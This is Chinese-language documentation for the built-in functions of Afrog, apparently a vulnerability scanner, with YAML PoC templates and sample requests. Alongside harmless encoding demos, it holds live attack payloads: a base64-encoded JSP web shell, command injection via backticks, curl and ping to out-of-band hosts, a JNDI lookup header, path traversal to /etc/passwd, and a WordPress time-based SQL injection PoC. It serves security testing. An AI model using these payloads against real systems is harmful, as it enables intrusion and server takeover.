## Afrog PoC 内置函数

内置函数源码位置：`v2\pkg\runner\celcompile.go`

### randomInt

生成一个指定长度的随机数字

生成一个 10000, 99999 之间的随机数

```
r1: randomInt(10000, 99999)
```

生成一个 800000000, 1000000000 之间的随机数

```
r1: randomInt(800000000, 1000000000)
```

randomInt 完整示例

```yaml
id: random-int-demo

info:
  name: Random Integer Demo
  author: zan8in
  severity: info

set:
  r1: randomInt(10000, 99999)
  r2: randomInt(800000000, 1000000000)
rules:
  r0:
    request:
      method: GET
      path: /r1={{r1}}&r2={{r2}}
    expression: true
expression: r0()
```

请求包

```
GET /r1=60501&r2=986034118 HTTP/1.1
Host: 192.168.66.166
```

### randomLowercase

生成一个指定长度的随机字符串

生成一个长度 6 的字符串

```
randstr: randomLowercase(6)
```

randomLowercase 完整示例

```yaml
id: random-string-demo

info:
  name: Random String Demo
  author: zan8in
  severity: info

set:
  randstr: randomLowercase(6)
  randbody: randomLowercase(32)
rules:
  r0:
    request:
      method: POST
      path: /filename={{randstr}}.php
      body: "{{randbody}}"
    expression: true
expression: r0()
```

请求包

```
POST /filename=xszgrr.php HTTP/1.1
Host: 192.168.66.166
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded

uxqbyjmetnfxsvxdqeirapxmrzwolksf
```

### bcontains

验证一个[]byte 是否包含另一个[]byte 的函数,区分大小写

```
response.body.bcontains(b'ThinkPHP')
response.raw_header.bcontains(b'Set-Cookie')
```

### ibcontains

验证一个[]byte 是否包含另一个[]byte 的函数,不区分大小写

```
response.body.ibcontains(b'thinkphp')
response.raw_header.ibcontains(b'set-cookie')
```

### contains

验证一个字符串是否包含另一个字符串的函数,区分大小写

```
response.headers["content-type"].icontains("application/json")
```

### icontains

验证一个字符串是否包含另一个字符串的函数,不区分大小写

```
response.headers["location"].icontains("zabbix.php?action=dashboard.view")
```

### replaceAll

用于替换字符串中的所有匹配项

基本用法

```
r1: replaceAll("this is a test", "test", "Test")
```

完整示例

```yaml
id: replace-all-demo

info:
  name: ReplaceAll Demo
  author: zan8in
  severity: info

set:
  r1: replaceAll("this is a test", "test", "Test")
rules:
  r0:
    request:
      method: POST
      path: /
      body: "{{r1}}"
    expression: true
expression: r0()
```

请求包

```
POST / HTTP/1.1
Host: 192.168.66.166
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded

this is a Test
```

### toUpper

字符串转为大写

```
r1: toUpper("admin")
```

结果

```
ADMIN
```

### toLower

字符串转为小写

```
r1: toLower("Admin")
```

结果

```
admin
```

### md5

md5 加密

加密一个随机 Int 类型变量

```
md5str: md5(string(randomInt(10000000, 50000000)))
```

加密一个随机 string 类型变量

```
md5str: md5(randomLowercase(16))
```

加密一个字符串

```
md5str: md5("123456")
```

md5 完整示例

创建 md5-demo.yaml 文件，编写内容

```yaml
id: md5-demo

info:
  name: MD5 Demo
  author: zan8in
  severity: info

set:
  md5str-1: md5(string(randomInt(10000000, 50000000)))
  md5str-2: md5(randomLowercase(16))
  r3: md5("123456")
rules:
  r0:
    request:
      method: GET
      path: /
      headers:
        md5-1: "{{md5str-1}}"
        md5-2: "{{md5str-2}}"
        md5-3: "{{r3}}"
    expression: true
expression: r0()
```

请求包

```text
GET / HTTP/1.1
Host: 192.168.66.166
Md5-1: a1291a39f613c3351516bf1e30ef3f40
Md5-2: 30272788dca037d61cb8e6790c61692f
Md5-3: e10adc3949ba59abbe56e057f20f883e
```

### base64

对字符串或字节数组进行 Base64 编码

编码一个字符串

```
admin: base64("admin:admin")
```

编码一个字节数组

```
user: base64(bytes("user:user"))
```

编码一个变量

```
rInt1: randomInt(800000000, 1000000000)
rInt2: randomInt(800000000, 1000000000)
result: base64(string(rInt1+rInt2))
```

base64 完整示例

```yaml
id: base64-demo

info:
  name: Base64 Demo
  author: zan8in
  severity: info

set:
  admin: base64("admin:admin")
  user: base64(bytes("user:user"))
  rInt1: randomInt(800000000, 1000000000)
  rInt2: randomInt(800000000, 1000000000)
  result: base64(string(rInt1+rInt2))
rules:
  r0:
    request:
      method: POST
      path: /
      headers:
        Authorization: "Basic {{admin}}"
        User: "{{user}}"
      body: "{{result}}"
    expression: true
expression: r0()
```

请求包

```
POST / HTTP/1.1
Host: 192.168.66.166
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Authorization: Basic YWRtaW46YWRtaW4=
User: dXNlcjp1c2Vy

MTc0ODQzNDI5Nw==
```

### base64Decode

对字符串或字节数组进行 Base64 解码

base64 完整示例

```yaml
id: base64-decode-demo

info:
  name: Base64 Decode Demo
  author: zan8in
  severity: info

set:
  bodystr: base64Decode("REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkTjFsaU40S1h3aVZHemZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpIHtTdHJpbmdCdWlsZGVyIGxpbmUgPSBuZXcgU3RyaW5nQnVpbGRlcigpO3RyeSB7UHJvY2VzcyBwcm8gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO0J1ZmZlcmVkUmVhZGVyIGJ1ZiA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocHJvLmdldElucHV0U3RyZWFtKCkpKTtTdHJpbmcgdGVtcCA9IG51bGw7d2hpbGUgKCh0ZW1wID0gYnVmLnJlYWRMaW5lKCkpICE9IG51bGwpIHtsaW5lLmFwcGVuZCh0ZW1wKyJcbiIpO31idWYuY2xvc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge2xpbmUuYXBwZW5kKGUuZ2V0TWVzc2FnZSgpKTt9cmV0dXJuIGxpbmUudG9TdHJpbmcoKTt9ICU+PCVpZigiYXNhc2QzMzQ0NSIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkmJiEiIi5lcXVhbHMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSl7b3V0LnByaW50bG4oIjxwcmU+IitleGN1dGVDbWQocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSArICI8L3ByZT4iKTt9ZWxzZXtvdXQucHJpbnRsbigiOi0pIik7fSU+NmU0ZjA0NWQ0Yjg1MDZiZjQ5MmFkYTdlMzM5MGQ3Y2U=")
rules:
  r0:
    request:
      method: POST
      path: /
      body: "{{bodystr}}"
    expression: true
expression: r0()
```

请求包

```
POST / HTTP/1.1
Host: 192.168.66.166
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded

DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd33445".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce
```

### urlencode

对字符串或字节数组进行 Url 编码

```
password: urlencode(base64("1234"))

```

urlencode 完整示例

```yaml
id: url-encode-demo

info:
  name: Url Encode Demo
  author: zan8in
  severity: info

set:
  filename: randomLowercase(4) + ".txt"
  content: randomLowercase(8)
  base64Url: urlencode(base64("`echo " + content + " > " + filename + "`"))
  password: urlencode(base64("1234"))
  bodystr: |
    <%@Register
        TagPrefix = 'x'
        Namespace = 'System.Runtime.Remoting.Services'
        Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
    %>
    <x:RemotingService runat='server'
        Context-Response-ContentType='xxx'
    />
  payload: urlencode(bodystr)
rules:
  r0:
    request:
      method: POST
      path: /user=admin&psw={{password}}&base64Url={{base64Url}}
      body: "{{payload}}"
    expression: true
expression: r0()
```

请求包

```
POST /user=admin&psw=MTIzNA%3D%3D&base64Url=YGVjaG8gZWFwZGh4aWogPiBlcGdkLnR4dGA%3D HTTP/1.1
Host: 192.168.66.166
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
Content-Type: application/x-www-form-urlencoded

%3C%25%40Register%0A++++TagPrefix+%3D+%27x%27%0A++++Namespace+%3D+%27System.Runtime.Remoting.Services%27%0A++++Assembly+%3D+%27System.Runtime.Remoting%2C+Version%3D4.0.0.0%2C+Culture%3Dneutral%2C+PublicKeyToken%3Db77a5c561934e089%27%0A%25%3E%0A%3Cx%3ARemotingService+runat%3D%27server%27%0A++++Context-Response-ContentType%3D%27xxx%27%0A%2F%3E%0A
```

### urldecode

对字符串或字节数组进行 Url 解码

```
url: urldecode("https%3A%2F%2Fexample%2Ecom")
```

urldecode 完整示例

```yaml
id: url-decode-demo

info:
  name: Url Decode Demo
  author: zan8in
  severity: info

set:
  url: urldecode("https%3A%2F%2Fexample%2Ecom")
rules:
  r0:
    request:
      method: GET
      path: /
      headers:
        Referer: "{{url}}"
    expression: true
expression: r0()
```

请求包

```
GET / HTTP/1.1
Host: 192.168.66.166
Referer: https://example.com
```

### hexdecode

对字符串进行 hex 解码

hexdecode 完整示例

```yaml
id: hex-decode-demo

info:
  name: Hex Decode Demo
  author: zan8in
  severity: info

set:
  hexbody: hexdecode("789c0bf06666e16200819c8abcf02241510f4e201b84851864189cc35c758d0c8c8c754dcc8d4cccf44a2a4a42433819981fdb05a79e63f34b2dade0666064f9cac8c0c0023201a83a3ec43538842bc09b91498e1997b1126071a026862d8d506d1896b0422c41b320c09b950da2979121024887824d02000d3f1fcb")
rules:
  r0:
    request:
      method: POST
      path: /
      body: "{{hexbody}}"
    expression: true
expression: r0()
```

请求包

```
POST / HTTP/1.1
Host: 192.168.66.166
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded

x�
�ff�b�����"AQN �d��\u�
?�!H��MJBC8����c�K-��f`d�����2�:>�58�+���I���`q�&�-�Pm��B,A� ���
```

### 日期

各种日期格式拼接

年
比如：2023

```
year = year(0)
```

年简写
比如：23

```
shortYear = shortyear(0)
```

月份
比如：12

```
month = month(0)
```

日
比如：02

```
day = day(0)
```

当前时间戳（秒）

```
tsecond = timestamp_second(0)
```

完整示例

```yaml
id: date-demo

info:
  name: Date Demo
  author: zan8in
  severity: info

set:
  year: year(0)
  shortYear: shortyear(0)
  month: month(0)
  day: day(0)
  tsecond: timestamp_second(0)
  millisecond: tsecond + "000"
  pathname: shortyear(0) + month(0)
  logfile: shortyear(0) + "_" + month(0) + "_" + day(0) + ".log"
rules:
  r0:
    request:
      method: GET
      path: /log={{pathname}}/{{logfile}}
      headers:
        Y: "{{year}}"
        S: "{{shortYear}}"
        M: "{{month}}"
        D: "{{day}}"
        T: "{{tsecond}}"
        MS: "{{millisecond}}"
        L: "log={{pathname}}/{{logfile}}"
    expression: true
expression: r0()
```

请求包

```
GET /log=2312/23_12_11.log HTTP/1.1
Host: 192.168.66.166
S: 23
M: 12
D: 11
T: 1702266237
Ms: 1702266237000
L: log=2312/23_12_11.log
Y: 2023
```

### versionCompare

用于类似 2.89.1 > 2.67.30 版本号大小的判断，返回 True / False

versionCompare 完整示例

```yaml
id: CVE-2023-46604

info:
  name: Apache ActiveMQ RCE
  author: zan8in
  severity: critical

set:
  hostname: request.url.host
  host: request.url.domain
  port: request.url.port
rules:
  r0:
    request:
      type: tcp
      host: "{{host}}:61616"
      data: "\n"
      read-size: 1024
    expression: response.raw.ibcontains(b'ActiveMQ')
    extractors:
      - type: regex
        extractor:
          ext1: '"ProviderVersion.+(?P<version>[0-9]\\.[0-9]{1,2}\\.[0-9]{1,2})".bsubmatch(response.raw)'
          version: ext1["version"]
  r1:
    request:
      type: tcp
      host: "{{host}}:61616"
      data: "\n"
      read-size: 1024
    expression: |
      versionCompare(string(version),"<","5.15.16") ||
      (versionCompare(string(version),">","5.16.0") && versionCompare(string(version),"<","5.16.7")) ||
      (versionCompare(string(version),">","5.17.0") && versionCompare(string(version),"<","5.17.6")) ||
      (versionCompare(string(version),">","5.18.0") && versionCompare(string(version),"<","5.18.3"))
expression: r0() && r1()
```

### bsubmatch

正则表达式处理中的一个函数，用于获取与指定子表达式匹配的部分字符串，用于提取匹配的子表达式内容。

返回值：提取匹配的子表达式内容

bsubmatch 完整示例

r0: 当登录请求成功且响应头包含 Set-Cookie 时，将其提取为变量 cookie。

r1: 使用提取的 Cookie 访问首页 /index.php。

```yaml
id: bsubmatch-demo

info:
  name: Regex bsubmatch Demo
  author: zan8in
  severity: info

rules:
  r0:
    request:
      method: POST
      path: /login.php
      body: "username=admin&password=123456"
    expression: true
    output:
      search: '"Set-Cookie: (?P<cookie>.+)".bsubmatch(response.raw_header)'
      cookie: search["cookie"]
  r1:
    request:
      method: GET
      path: /index.php
      headers:
        Cookie: "{{cookie}}"
    expression: true
expression: r0()
```

r0 请求

```
POST /login.php HTTP/1.1
Host: 192.168.66.166
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Content-Type: application/x-www-form-urlencoded

username=admin&password=123456
```

r0 响应

```
HTTP/1.1 302
Content-Type: text/html; charset=iso-8859-1
Date: Mon, 11 Dec 2023 06:06:42 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
Set-Cookie: PHPSESSID=xxx.xxx; Path="/"
```

r1 请求

```
GET /index.php HTTP/1.1
Host: 192.168.66.166
Cookie: PHPSESSID=xxx.xxx; Path="/"
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
```

r1 响应

```
HTTP/1.1 200
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
Content-Length: 326
Content-Type: text/html; charset=iso-8859-1
Date: Mon, 11 Dec 2023 06:06:42 GMT

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>Admin Panel</title>
</head><body>
<h1>Console</h1>
...
</body></html>
```

### bmatches

用于检查一个字符串是否与正则表达式匹配。

返回值：True / False

读取文件 /etc/passwd 并验证是否成功读取

```yaml
id: fileread-demo

info:
  name: File Read Demo
  author: zan8in
  severity: info

rules:
  r0:
    request:
      method: POST
      path: /download.php?file=../../../etc/passwd
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
```

执行系统命令`id`并验证是否成功执行

```yaml
id: rce-demo

info:
  name: Remote Code Execution Demo
  author: zan8in
  severity: info

rules:
  r0:
    request:
      method: POST
      path: /rce.php?cmd=id
    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
expression: r0()
```

### oob()

`oob()` 用于执行无回显的命令的 POC，通过调用外部链接平台，在等待几秒钟后请求该外部链接平台，以验证是否成功接收到命令执行的信号。

oob() 漏洞验证要求配置 oob() 环境，[配置教程](https://github.com/zan8in/afrog?tab=readme-ov-file#ceye-configuration)

基本用法

set 声明两个变量

`oob`: 初始化一个 dnslog

`oobHTTP`: dnslog 的 url，比如 http://xxxxxx.xxyyy.ceye.io，一般用于 curl {{oobHTTP}} 操作

`oobDNS`: dnslog 的 host，比如 xxyy.ceye.io，一般用于 ping {{oobDNS}} 操作

```
set:
  oob: oob()
  oobHTTP: oob.HTTP
  oobDNS: oob.DNS
```

#### OOB HTTP

```yaml
id: oob-http-demo

info:
  name: OOB HTTP Demo
  author: zan8in
  severity: info

set:
  oob: oob()
  oobHTTP: oob.HTTP
rules:
  r0:
    request:
      method: POST
      path: /rce.php
      body: |
        <?xml version="1.0"?>
        <methodCall>
          <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
          <params>
          <param>
          <string>curl {{oobHTTP}}</string>
          </param>
          </params>
        </methodCall>
    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
expression: r0()
```

请求包

```
POST /rce.php HTTP/1.1
Host: 192.168.66.166
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0"?>
<methodCall>
  <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
  <params>
  <param>
  <string>curl http://36sSyqGPGpMZ.xxyy.dnslogxx.sh</string>
  </param>
  </params>
</methodCall>
```

#### OOB DNS

```yaml
id: oob-dns-demo

info:
  name: OOB DNS Demo
  author: zan8in
  severity: info

set:
  oob: oob()
  oobDNS: oob.DNS
rules:
  r0:
    request:
      method: GET
      path: /cmd=`ping {{oobDNS}}`
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
```

请求包

```
GET /cmd=`ping 36sSyqGPGpMZ.xxyy.dnslogxx.sh` HTTP/1.1
Host: 192.168.66.166
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
```

#### OOB JNDI

```yaml
id: oob-jndi-demo

info:
  name: OOB JNDI Demo
  author: zan8in
  severity: info

set:
  oob: oob()
  oobDNS: oob.DNS
rules:
  r0:
    request:
      method: GET
      path: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
      headers:
        X-Forwarded-For: "${jndi://{{oobDNS}}}"
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
```

请求包

```
GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
Host: 192.168.66.166
X-Forwarded-For: ${jndi:ldap://x.x.x.x:1389/QW5qJX3cb16PKivauJxyWl}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
```

### Ysoserial

用于生成 Java 反序列化 payload

基本用法

```
ysoserial(payload, command, encode)
```

payload: 攻击载荷，[支持 payload 列表](https://github.com/zan8in/afrog/blob/main/pkg/utils/ysoserial.go)

command: 执行的命令，比如 xxx.dnslog.cn

encode: 加密方法，目前支持：base64 和 hex

参考示例

[CVE-2023-49070](https://github.com/zan8in/afrog/blob/46404e7527ca8d5752a9679ce13c83f7fd7b9e5b/pocs/afrog-pocs/CVE/2023/CVE-2023-49070.yaml#L2)、[CVE-2021-29200](https://github.com/zan8in/afrog/blob/46404e7527ca8d5752a9679ce13c83f7fd7b9e5b/pocs/afrog-pocs/CVE/2021/CVE-2021-29200.yaml)

### AesCBC

用于 aes cbc 加密的 PoC

基本用法

```
aesCBC(text,key,iv)
```

text: 被加密的字符串

key: 加密 key

iv: 加密 iv

返回加密结果

参考示例

[CVE-2023-20888](https://github.com/zan8in/afrog/blob/46404e7527ca8d5752a9679ce13c83f7fd7b9e5b/pocs/afrog-pocs/CVE/2023/CVE-2023-20888.yaml)

### 需要人工验证

虽然不完全确定是漏洞，但仍希望编写针对该潜在漏洞的 POC，并在 POC 中加入提示（tips）注释以便理解。
基本用法

```
extractors:
  - type: word
    extractor:
      tips: "需要进行人工核查 (Manual verification is required)"
```

<img src="https://github.com/zan8in/afrog/blob/main/images/verification-is-needed.png" >

### SQL 盲注

通过响应时间来判断是否存在 SQL 注入漏洞。

基本语法

```
response.latency <= 12000
```

确定响应时间的阈值分别为 12000 毫秒（即 12 秒）和 6000 毫秒（即 6 秒）。当两次请求均满足这些时间条件时，视为第一轮验证通过。整个验证过程需至少进行两轮。

以下示例展示了如何进行两轮盲注验证。

```yaml
id: CVE-2024-1061

info:
  name: WordPress HTML5 Video Player SQL注入
  author: zan8in
  severity: high
  verified: true
  description: |-
    Fofa: "wordpress" && body="html5-video-player"
  reference:
    - https://mp.weixin.qq.com/s/CqxyVUaSEwgjrCA8aLKQpg
  tags: cve,cve2024,wordpress,sqli
  created: 2024/02/21

rules:
  r0:
    request:
      method: GET
      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(10)))a)--+
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'created_at') &&
      response.body.bcontains(b'video_id') &&
      response.latency <= 12000 &&  
      response.latency >= 10000
  r1:
    request:
      method: GET
      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'created_at') &&
      response.body.bcontains(b'video_id') &&
      response.latency <= 8000 &&  
      response.latency >= 6000
  r2:
    request:
      method: GET
      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(10)))a)--+
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'created_at') &&
      response.body.bcontains(b'video_id') &&
      response.latency <= 12000 &&  
      response.latency >= 10000
  r3:
    request:
      method: GET
      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'created_at') &&
      response.body.bcontains(b'video_id') &&
      response.latency <= 8000 &&  
      response.latency >= 6000
extractors:
  - type: word
    extractor:
      latency1: "6s"
      latency2: "10s"
expression: r0() && r1() && r2() && r3()
```

### -validate 参数
验证 PoC 文件的有效性和语法正确性

基本用法

```
afrog -validate /path/to/poc/file.yaml
```

验证单个 PoC 文件

```
afrog -validate pocs/cve-2024-1061.yaml
```

验证整个目录下的所有 PoC 文件
```
afrog -validate pocs/
```


